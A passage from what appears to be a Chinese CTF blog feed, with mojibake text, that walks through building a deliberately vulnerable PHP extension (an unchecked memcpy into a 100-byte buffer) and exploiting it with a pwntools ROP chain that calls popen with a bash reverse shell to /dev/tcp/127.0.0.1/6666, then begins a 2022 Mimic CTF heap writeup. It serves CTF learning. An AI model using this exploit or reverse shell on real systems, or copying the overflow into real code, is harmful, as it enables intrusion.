*webpwn_globals)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">webpwn_globals-&gt;global_value = 0;</span></span><br><span class="line"><span class="comment">webpwn_globals-&gt;global_string = NULL;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* If you have INI entries, uncomment these lines</span></span><br><span class="line"><span class="comment">REGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* uncomment this line if you have INI entries</span></span><br><span class="line"><span class="comment">UNREGISTER_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request start */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(COMPILE_DL_WEBPWN) &amp;&amp; defined(ZTS)</span></span><br><span class="line">ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove if there&#x27;s nothing to do at request end */</span></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RSHUTDOWN_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RSHUTDOWN_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line">php_info_print_table_start();</span><br><span class="line">php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;webpwn support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">php_info_print_table_end();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Remove comments if you have entries in php.ini</span></span><br><span class="line"><span class="comment">DISPLAY_INI_ENTRIES();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_functions[]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Every user visible function must have an entry in webpwn_functions[].</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">PHP_FE(confirm_webpwn_compiled,<span class="literal">NULL</span>)<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">PHP_FE_END<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; webpwn_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry webpwn_module_entry = &#123;</span><br><span class="line">STANDARD_MODULE_HEADER,</span><br><span class="line"><span class="string">&quot;webpwn&quot;</span>,</span><br><span class="line">webpwn_functions,</span><br><span class="line">PHP_MINIT(webpwn),</span><br><span class="line">PHP_MSHUTDOWN(webpwn),</span><br><span class="line">PHP_RINIT(webpwn),<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request start */</span></span><br><span class="line">PHP_RSHUTDOWN(webpwn),<span class="comment">/* Replace with NULL if there&#x27;s nothing to do at request end */</span></span><br><span class="line">PHP_MINFO(webpwn),</span><br><span class="line">PHP_WEBPWN_VERSION,</span><br><span class="line">STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> COMPILE_DL_WEBPWN</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(webpwn)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Local variables:</span></span><br><span class="line"><span class="comment"> * tab-width: 4</span></span><br><span class="line"><span class="comment"> * c-basic-offset: 4</span></span><br><span class="line"><span class="comment"> * End:</span></span><br><span class="line"><span class="comment"> * vim600: noet sw=4 ts=4 fdm=marker</span></span><br><span class="line"><span class="comment"> * vim&lt;600: noet sw=4 ts=4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹ä¸¤ä¸ªå…³é”®çš„éƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯ç”¨æ¥å†™æˆ‘ä»¬ç”Ÿæˆçš„ä¸»ä»£ç å‡½æ•°PHP_FUNCTION</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(confirm_webpwn_compiled)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strg = strpprintf(<span class="number">0</span>, <span class="string">&quot;Congratulations! You have successfully modified ext/%.78s/config.m4. Module %.78s is now compiled into PHP.&quot;</span>, <span class="string">&quot;webpwn&quot;</span>, arg);</span><br><span class="line"></span><br><span class="line">RETURN_STR(strg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦çš„ä»£ç å°±æ˜¯åœ¨ è¿™é‡Œé¢è¿›è¡Œå†™ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(webpwn)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">size_t</span> arg_len, len;</span><br><span class="line">zend_string *strg;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf,arg,arg_len);</span><br><span class="line">php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†™å®Œä¸€ä¸ªå‡½æ•°ï¼Œç„¶åéœ€è¦æ³¨å†Œä¸‹è¿™ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> zend_function_entry webpwn_functions[] = &#123;</span><br><span class="line">PHP_FE(confirm_webpwn_compiled,<span class="literal">NULL</span>)<span class="comment">/* For testing, remove later. */</span></span><br><span class="line">PHP_FE(webpwn,<span class="literal">NULL</span>)   <span class="comment">//åœ¨è¿™é‡Œè¿›è¡Œæ³¨å†Œï¼Œç„¶åæ³¨å†Œä¸ªåˆšåˆšå†™çš„å‡½æ•°</span></span><br><span class="line">PHP_FE_END<span class="comment">/* Must be the last line in webpwn_functions[] */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ³¨å†Œå¥½ä»¥åï¼Œä¸‹ä¸€æ­¥ç›´æ¥makeï¼Œè¿›è¡Œmakeä¸€ä¸‹å³å¯</p><p>makeåï¼Œä¼šåœ¨å¯¹åº”çš„ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªmodulesã€‚è¿™é‡Œé¢å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„æ‰©å±•åº“</p><p>ç„¶ååœ¨æˆ‘ä»¬çš„php.iniåŠ è½½æ‰©å±•åº“</p><p>æŸ¥æ‰¾php.iniæ–¹æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo find / -name php.ini</span><br><span class="line">/etc/php/7.2/cli/php.ini</span><br><span class="line">åœ¨php.iniåŠ è½½æˆ‘ä»¬è‡ªå·±ç”Ÿæˆçš„æ‹“å±•åº“</span><br><span class="line">extension=webpwn.so</span><br></pre></td></tr></table></figure><p>åŠ è½½èµ·æ¥ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬è¿˜è¦æŠŠå¯¹åº”çš„åº“æ”¾åˆ°æˆ‘ä»¬æœ¬åœ°å¯¹åº”çš„åŠ è½½åº“é‡Œï¼Œå¦‚ä½•æ‰¾è¿™ä¸ªæœ¬åœ°åº“çš„ä½ç½®å‘¢</p><p>æˆ‘ä»¬å…ˆå†™ä¸ªphpæ–‡ä»¶è®©å®ƒè¿è¡Œphp test.php | grep â€œwebpwnâ€ </p><p>ç„¶åæŠ¥é”™ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;webpwn.so&#x27; (tried: /usr/lib/php/20170718/webpwn.so (/usr/lib/php/20170718/webpwn.so: cannot open shared object file: No such file or directory), /usr/lib/php/20170718/webpwn.so.so (/usr/lib/php/20170718/webpwn.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¯¹åº”çš„ç›®å½•é‡Œæ²¡æœ‰æˆ‘ä»¬ç”Ÿæˆçš„åº“&#x2F;usr&#x2F;lib&#x2F;php&#x2F;20170718&#x2F;</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±æŠŠè‡ªå·±ç”Ÿæˆçš„webpwnåº“æ”¾åˆ°è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œ</p><p>ç„¶åå†è¿è¡Œå°±ä¸æŠ¥é”™äº†</p><p>è¿˜æœ‰ä¸€ç‚¹è¯´çš„æ˜¯</p><p>æˆ‘ä»¬ç¼–å†™çš„phpæ–‡ä»¶ï¼Œç„¶åç”¨phpè¿è¡Œå…¶ä¸­åŸç†æ˜¯ç”¨æˆ‘ä»¬åŠ è½½çš„æŒ‡å®šçš„ç”Ÿæˆåº“</p><p>é‚£è¿™æ ·çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°webpwnçš„æ€è·¯äº†ï¼Œç›´æ¥å»é€†è¿™ä¸ªåº“ï¼Œæ‰¾åˆ°è¿™ä¸ªåº“çš„æ¼æ´ï¼Œæ˜¯ä¸æ˜¯å°±èƒ½å®ç°phppwnäº†ï¼Œç­”æ¡ˆï¼šæ˜¯çš„</p><p>æŠŠwebpwn.soæ”¾åˆ°idaé‡Œï¼Œæ‰¾åˆ°å¯¹åº”çš„å‡½æ•°ï¼Œzif_webpwn:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">zif_webpwn</span><span class="params">(zend_execute_data *execute_data, zval *return_value)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+80h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *arg; <span class="comment">// [rsp+88h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  arg = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)zend_parse_parameters(execute_data-&gt;This.u2.next, <span class="string">&quot;s&quot;</span>, &amp;arg, &amp;n) != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, arg, n);</span><br><span class="line">    php_printf(<span class="string">&quot;The baby phppwn.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿™ä¸ªç¨‹åºæ˜¯æœ‰æ ˆæº¢å‡ºçš„ï¼Œmemcpyå¯¹bufè¿›è¡Œäº†æº¢å‡º</p><p>ç„¶åä¸‹ä¸€æ­¥æˆ‘ä»¬å°±å¼€å§‹å†™è„šæœ¬è¿›è¡Œè§¦å‘è¿™ä¸ªæ ˆæº¢å‡ºï¼Œæ³¨æ„ç‚¹å°±æ˜¯ä¸èƒ½ç›´æ¥æ‹¿shellï¼Œéœ€è¦åå¼¹shellï¼Œè¿™é‡Œé‡‡ç”¨popen</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">popen(/bin/bash -c <span class="string">&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1&quot;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åªè¦æ‰¾åˆ°å¯¹åº”çš„rdiå’Œrsiä¼ å‚å³å¯ï¼Œå…·ä½“æ‰¾æ³•å°±æ˜¯é‡‡ç”¨ROPbinaryè¿›è¡Œæ‰¾å¯„å­˜å™¨ï¼Œç„¶åä¼ å‚å°±å¯ä»¥äº†</p><p>è¿™é‡ŒçŸ¥é“äº†æ¼æ´ï¼Œæˆ‘ä»¬ç›´æ¥å¼€å§‹å†™è„šæœ¬(ç”±äºæ–¹ä¾¿æœ¬åœ°è°ƒè¯•ï¼Œè¿™é‡Œæˆ‘ä»¬å…³é—­æœ¬åœ°éšæœºåŒ–ï¼Œæˆ‘æ˜¯åœ¨Ubuntu20ç¯å¢ƒä¸‹æ‰“çš„ï¼Œéœ€è¦ç”¨åˆ°æ ˆå¯¹é½)</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">chuangjian</span>(<span class="params">buf</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;jsjsj.php&quot;</span>, <span class="string">&#x27;w+&#x27;</span>) <span class="keyword">as</span> pf:</span><br><span class="line">        pf.write(<span class="string">&#x27;&#x27;&#x27;&lt;?php </span></span><br><span class="line"><span class="string">        webpwn(urldecode(&quot;%s&quot;));</span></span><br><span class="line"><span class="string">        ?&gt;&#x27;&#x27;&#x27;</span>%urlencode(buf))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span>)</span><br><span class="line">libc.address =<span class="number">0x7ffff763a000</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span>+libc.address</span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span>+libc.address</span><br><span class="line">popen_addr = libc.sym[<span class="string">&#x27;popen&#x27;</span>]</span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">cmd = <span class="string">&quot;/bin/bash -c \&quot;/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1\&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">stack_base = <span class="number">0x7ffffffde000</span></span><br><span class="line">stack_offset = <span class="number">0x1c330</span></span><br><span class="line">ret=<span class="number">0x0000000000022679</span>+libc.address</span><br><span class="line">stack_addr = stack_offset+stack_base</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(ret)+p64(pop_rdi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x30</span>+<span class="number">0x60</span>+<span class="number">415</span>-<span class="number">23</span>)+p64(pop_rsi)+p64(stack_addr+<span class="number">0x88</span>+<span class="number">0x28</span>+<span class="number">384</span>+<span class="number">8</span>)\</span><br><span class="line">+p64(popen_addr)+ <span class="string">&#x27;r&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">7</span>+popen_addr+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>+cmd.ljust(<span class="number">0x60</span>, <span class="string">&#x27;\x00&#x27;</span>)+<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span></span><br><span class="line">chuangjian(payload)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ç”Ÿæˆphp expï¼Œç„¶ågdbåŠ¨è°ƒæ–¹æ³•è®¾ç½®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gdb php   #åŠ¨è°ƒphp</span><br><span class="line">set args php_exp.php</span><br><span class="line">run  #åŠ è½½åˆ°æˆ‘ä»¬çš„webpwnåº“</span><br><span class="line">b zif_webpwn  #æŠŠæ–­ç‚¹ä¸‹åˆ°æˆ‘ä»¬å†™çš„æ¼æ´æ–‡ç« </span><br><span class="line">run  #å†runä¸‹å°±åˆ°æˆ‘ä»¬çš„æ–­ç‚¹ä¸»å‡½æ•°äº†ã€‚è¿›è¡ŒåŠ¨è°ƒå°±å¯ä»¥äº†</span><br></pre></td></tr></table></figure><p>é‡åˆ°çš„ğŸ•³ï¼š</p><p>è¿™ä¸ªexpåœ¨è°ƒè¯•ä¸­æœ‰å¾ˆå¤šæ›²æŠ˜ï¼Œå‘œå‘œå‘œï¼Œå› ä¸ºæˆ‘çŠ¯äº†ä¸€ä¸ªå¾ˆä½çº§çš„é”™è¯¯ï¼Œå°±æ˜¯retæ ˆå¯¹é½ï¼Œæ ˆå¯¹å…¶ä¹‹åï¼Œä¸€ç›´æŠ¥segmentaton faultï¼Œç„¶ååŠ¨è°ƒäº†å¥½ä¹…ï¼Œå‘ç°è‡ªå·±s***äº†ï¼Œå…‰æŠŠretå¡«åˆ°å‰é¢äº†ï¼Œåé¢ æ ˆæœ‰äº›åç§»å’Œå®é™…ä¸ç¬¦åˆå¯¼è‡´rdiå’Œrsiæ²¡ä¼ è¿›å»ï¼Œç„¶åç»†è°ƒäº†ä¸‹å°±å¯ä»¥äº†ï¼Œå…¶å®è¿™ä¸ªåœ°æ–¹æ˜¯ä¸ªå¾ˆä½çº§çš„é”™è¯¯ï¼Œæ²¡åŠæ³•ğŸ‘´è¿˜æ˜¯èœ</p><h2 id="æ€»ç»“ï¼šé€šè¿‡æœ¬ç¯‡webpwnèƒ½å…¥é—¨php-web-pwn-çŸ¥é“äº†æ¯”èµ›ä¸­çš„web-pwnæ˜¯æ€ä¹ˆåšçš„ä¸€ä¸ªæµç¨‹ï¼Œç”±äºæ—¶é—´åŸå› ï¼Œæœ‰ä¸¤é“é¢˜æ²¡æœ‰å™è¿°ï¼Œè¿™ä¸ªä¼šæ”¾åˆ°ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä¸‹ç¯‡æ–‡ç« ä¼°è®¡ä¼š3å¤©ä»¥åå‘ï¼Œwebpwnç¡®å®æ˜¯ä¸€ä¸ªä»¤æˆ‘æ„Ÿè§‰åšpwnæ–¹å‘æœ€æœ‰æ„æ€çš„pwné¢˜ï¼Œå› ä¸ºå®ƒæ˜¯webå’Œpwnç›¸ç»“åˆèµ·æ¥äº†ï¼Œè¿™ä¸ªéå¸¸è§„pwné¢˜-æ˜¯çœŸæœ‰æ„æ€ï¼Œç»å…¸åè¨€ï¼šNO-PWN-Rev-NO-FUNï¼ï¼ï¼ï¼"><a href="#æ€»ç»“ï¼šé€šè¿‡æœ¬ç¯‡webpwnèƒ½å…¥é—¨php-web-pwn-çŸ¥é“äº†æ¯”èµ›ä¸­çš„web-pwnæ˜¯æ€ä¹ˆåšçš„ä¸€ä¸ªæµç¨‹ï¼Œç”±äºæ—¶é—´åŸå› ï¼Œæœ‰ä¸¤é“é¢˜æ²¡æœ‰å™è¿°ï¼Œè¿™ä¸ªä¼šæ”¾åˆ°ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä¸‹ç¯‡æ–‡ç« ä¼°è®¡ä¼š3å¤©ä»¥åå‘ï¼Œwebpwnç¡®å®æ˜¯ä¸€ä¸ªä»¤æˆ‘æ„Ÿè§‰åšpwnæ–¹å‘æœ€æœ‰æ„æ€çš„pwné¢˜ï¼Œå› ä¸ºå®ƒæ˜¯webå’Œpwnç›¸ç»“åˆèµ·æ¥äº†ï¼Œè¿™ä¸ªéå¸¸è§„pwné¢˜-æ˜¯çœŸæœ‰æ„æ€ï¼Œç»å…¸åè¨€ï¼šNO-PWN-Rev-NO-FUNï¼ï¼ï¼ï¼" class="headerlink" title="æ€»ç»“ï¼šé€šè¿‡æœ¬ç¯‡webpwnèƒ½å…¥é—¨php(web)pwn,çŸ¥é“äº†æ¯”èµ›ä¸­çš„web pwnæ˜¯æ€ä¹ˆåšçš„ä¸€ä¸ªæµç¨‹ï¼Œç”±äºæ—¶é—´åŸå› ï¼Œæœ‰ä¸¤é“é¢˜æ²¡æœ‰å™è¿°ï¼Œè¿™ä¸ªä¼šæ”¾åˆ°ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä¸‹ç¯‡æ–‡ç« ä¼°è®¡ä¼š3å¤©ä»¥åå‘ï¼Œwebpwnç¡®å®æ˜¯ä¸€ä¸ªä»¤æˆ‘æ„Ÿè§‰åšpwnæ–¹å‘æœ€æœ‰æ„æ€çš„pwné¢˜ï¼Œå› ä¸ºå®ƒæ˜¯webå’Œpwnç›¸ç»“åˆèµ·æ¥äº†ï¼Œè¿™ä¸ªéå¸¸è§„pwné¢˜ æ˜¯çœŸæœ‰æ„æ€ï¼Œç»å…¸åè¨€ï¼šNO PWN(Rev) NO FUNï¼ï¼ï¼ï¼"></a>æ€»ç»“ï¼šé€šè¿‡æœ¬ç¯‡webpwnèƒ½å…¥é—¨php(web)pwn,çŸ¥é“äº†æ¯”èµ›ä¸­çš„web pwnæ˜¯æ€ä¹ˆåšçš„ä¸€ä¸ªæµç¨‹ï¼Œç”±äºæ—¶é—´åŸå› ï¼Œæœ‰ä¸¤é“é¢˜æ²¡æœ‰å™è¿°ï¼Œè¿™ä¸ªä¼šæ”¾åˆ°ä¸‹ä¸€ç¯‡æ–‡ç« é‡Œï¼Œä¸‹ç¯‡æ–‡ç« ä¼°è®¡ä¼š3å¤©ä»¥åå‘ï¼Œwebpwnç¡®å®æ˜¯ä¸€ä¸ªä»¤æˆ‘æ„Ÿè§‰åšpwnæ–¹å‘æœ€æœ‰æ„æ€çš„pwné¢˜ï¼Œå› ä¸ºå®ƒæ˜¯webå’Œpwnç›¸ç»“åˆèµ·æ¥äº†ï¼Œè¿™ä¸ªéå¸¸è§„pwné¢˜ æ˜¯çœŸæœ‰æ„æ€ï¼Œç»å…¸åè¨€ï¼šNO PWN(Rev) NO FUNï¼ï¼ï¼ï¼</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;éå¸¸è§„PWN-Web-pwn-ä¸€&quot;&gt;&lt;a href=&quot;#éå¸¸è§„PWN-Web-pwn-ä¸€&quot; class=&quot;headerlink&quot; title=&quot;éå¸¸è§„PWN&amp;amp;Web pwn(ä¸€)&quot;&gt;&lt;/a&gt;éå¸¸è§„PWN&amp;amp;Web pwn(ä¸€)&lt;/h1&gt;&lt;h3 id=</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2022 Strong Network Mimic CTF PWN writeup</title>
    <link href="https://jsjsj.top/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/"/>
    <id>https://jsjsj.top/2022/10/03/2022%20Strong%20Network%20Mimic%20CTF%20PWN%20writeup/</id>
    <published>2022-10-03T14:12:28.000Z</published>
    <updated>2023-10-03T14:30:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022-Strong-Network-Mimic-CTF-PWN-writeup"><a href="#2022-Strong-Network-Mimic-CTF-PWN-writeup" class="headerlink" title="2022 Strong Network Mimic CTF PWN writeup"></a>2022 Strong Network Mimic CTF PWN writeup</h1><p><strong>Foreword: It was too difficult. I didnâ€™t sign up for the competition. My teammates sent two questions, webpwn. At first, it felt like an httpd question. In the end, it took a long time to find out that it was a VM http web heap question. It took a long time to debug the inverse parameters. Iâ€™m too naive. I feel that if these two questions are understood inversely, it will be easy to do. It is mainly about the inverse parameters. Reverse flow for this problem</strong></p><p>According to the normal reverse thinking, first general audit, find the main function, in the main function, find the logic of each function, find the logic of each function, and then expand to see</p><h2 id="webheap"><a href="#webheap" class="headerlink" title="webheap:"></a>webheap:</h2><p>The main functions of this question are as follows</p><ol><li>When receiving and sending packets, mainly complete the sending of packets, but this function does not do any conversion</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_1999</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// bl</span></span><br><span class="line">  <span class="type">char</span> 